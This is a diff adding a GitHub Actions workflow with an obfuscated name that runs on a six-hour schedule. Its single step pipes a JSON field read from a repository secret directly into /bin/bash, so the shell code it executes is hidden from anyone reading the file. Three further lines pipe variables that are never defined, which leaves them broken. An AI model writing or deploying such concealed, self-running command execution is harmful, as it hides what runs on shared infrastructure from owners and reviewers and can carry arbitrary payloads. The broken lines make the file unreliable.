@@ -1,0 +1,21 @@
+name: luantanwanyu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luantanwanyu
+        env:
+          d86628: ${{ secrets.d86628 }}
+        run: |
+          echo $d86628 | jq -r .ocfxo57382 | /bin/bash
+          echo $ik2 | jq -r .obdd5355 | /bin/bash
+          echo $gc70 | jq -r .d7 | /bin/bash
+          echo $lw08 | jq -r .xhlm42087 | /bin/bash
+
